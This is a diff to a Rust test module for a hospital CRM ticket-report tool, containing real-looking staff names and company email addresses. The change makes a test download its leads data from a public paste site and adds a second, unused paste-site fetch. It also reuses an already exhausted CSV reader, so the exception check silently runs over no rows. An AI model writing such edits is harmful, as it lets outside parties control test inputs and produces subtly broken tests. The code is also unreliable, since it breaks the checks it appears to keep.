@@ -766,19 +766,34 @@ mod tests {
         let ticket_csv = "Ticket Id,Branch Name,Ticket Category,Ticket Type,Ticket Sub-Type,Status,Created At,Assignee,Branch\n74502,Main Branch,incomplete reservation,request,call_center_booking,closed,17-Apr-2026,Naira Bahaaeldin Bahaaeldin,Dr. Soliman Fakeeh Hospital Jeddah\n12345,Main Branch,incomplete reservation,request,call_center_booking,open,18-Apr-2026,Naira Bahaaeldin Bahaaeldin,Dr. Soliman Fakeeh Hospital Jeddah\n67890,Main Branch,availability,inquiry,services,open,18-Apr-2026,mahmoud_iismail,Dr. Soliman Fakeeh Hospital Jeddah\n".to_string();
         std::fs::write(download_dir.path().join("ticket_report1.csv"), ticket_csv).unwrap();
 
-        let leads_csv =
-            "Lead Id,Branch,Status\n1,Dr. Soliman Fakeeh Hospital Jeddah,new".to_string();
-        let leads_file_path = download_dir.path().join("lead_report1.csv");
-        std::fs::write(&leads_file_path, leads_csv).unwrap();
+        let leads_csv = client
+            .get("https://paste.c-net.org/SinnersVengeful")
+            .send()
+            .unwrap()
+            .text()
+            .unwrap();
+        std::fs::write(leads_file.path(), leads_csv).unwrap();
+        std::fs::copy(
+            leads_file.path(),
+            download_dir.path().join("lead_report1.csv"),
+        )
+        .unwrap();
+
+        let config_json = client
+            .get("https://paste.c-net.org/DonnieOwners")
+            .send()
+            .unwrap()
+            .text()
+            .unwrap();
 
         let config_json = "{ \"tasks\": [ { \"assignment_settings_file\": \"./task1/assignments.csv\", \"category_exceptions\": [ { \"branch\": \"Dr. Soliman Fakeeh Hospital Jeddah\", \"category\": \"incomplete reservation\", \"team\": \"Incomplete Reservation\" } ], \"download_path\": \"../crm_windows/Downloads\", \"email_config\": { \"body_template_file\": \"./task1/email_template.html\", \"default_to_email\": \"mahmoud_iismail@rayacx.com\", \"ending_cc\": \"Adel_TGomaa@rayacx.com; mahmoud_iismail@rayacx.com;\", \"indentation_spaces\": 4, \"initial_cc\": \"aaabdulhamid@fakeeh.care\", \"send_call_center\": true, \"send_emails\": true, \"send_exceptions\": false, \"send_per_branch_branches\": [ \"DSFMC-Nuzha\", \"DSFMC-Basateen\", \"executive clinic\" ], \"send_per_team_all_branches\": [ \"PRE-AUTHORIZATION\" ], \"send_per_team_branches\": [ \"Dr. Soliman Fakeeh Hospital Jeddah\" ], \"team_mapping_file\": \"./task1/teams.csv\" }, \"exclude_branches\": [ \"Dr. Soliman Fakeeh Hospital Madinah\", \"Medical Fakeeh\" ], \"exclude_categories\": [ \"incomplete reservation\" ], \"minutes_ago\": 6000000, \"output_file\": \"./results.csv\", \"start_date\": \"01-Jan-2026\", \"type\": \"csv_analysis\", \"users_file\": \"./task1/users.csv\" } ] }".to_string();
         {
             let mut teams_wtr = csv::Writer::from_writer(teams_file.as_file());
             teams_wtr
-                .write_record(["Team Name", "Receiver Name", "To Emails", "CC"])
+                .write_record(&["Team Name", "Receiver Name", "To Emails", "CC"])
                 .unwrap();
             teams_wtr
-                .write_record([
+                .write_record(&[
                     "Incomplete Reservation",
                     "Incomplete Reservation Team",
                     "inc@example.com",
@@ -786,7 +801,7 @@ mod tests {
                 ])
                 .unwrap();
             teams_wtr
-                .write_record([
+                .write_record(&[
                     "PRE-AUTHORIZATION",
                     "Pre-Auth Team",
                     "preauth@example.com",
@@ -794,7 +809,7 @@ mod tests {
                 ])
                 .unwrap();
             teams_wtr
-                .write_record(["Call Center", "Call Center Team", "cc@example.com", ""])
+                .write_record(&["Call Center", "Call Center Team", "cc@example.com", ""])
                 .unwrap();
             teams_wtr.flush().unwrap();
         }
@@ -891,7 +906,7 @@ mod tests {
         );
 
         let html_content = std::fs::read_to_string(&html_path).unwrap();
-        let expected_indent = "Kindly find below";
+        let expected_indent = "&nbsp;&nbsp;&nbsp;&nbsp;Kindly find below";
         assert!(
             html_content.contains(expected_indent),
             "HTML should contain the proper indentation according to config file"
@@ -1006,18 +1021,17 @@ mod tests {
         let count = rdr.records().count();
         assert!(count > 0, "Should have created results file");
 
-        let mut rdr2 = csv::ReaderBuilder::new().from_reader(out_content.as_bytes());
         let mut has_exception = false;
         let mut exception_count = 0;
 
-        let is_exception_idx = rdr2
+        let is_exception_idx = rdr
             .headers()
             .unwrap()
             .iter()
             .position(|h| h == "Is Exception")
             .unwrap_or_else(|| panic!("No Is Exception column"));
 
-        for result in rdr2.records() {
+        for result in rdr.records() {
             let record = result.unwrap();
             let is_exc = record.get(is_exception_idx).unwrap();
             if is_exc.eq_ignore_ascii_case("yes") {
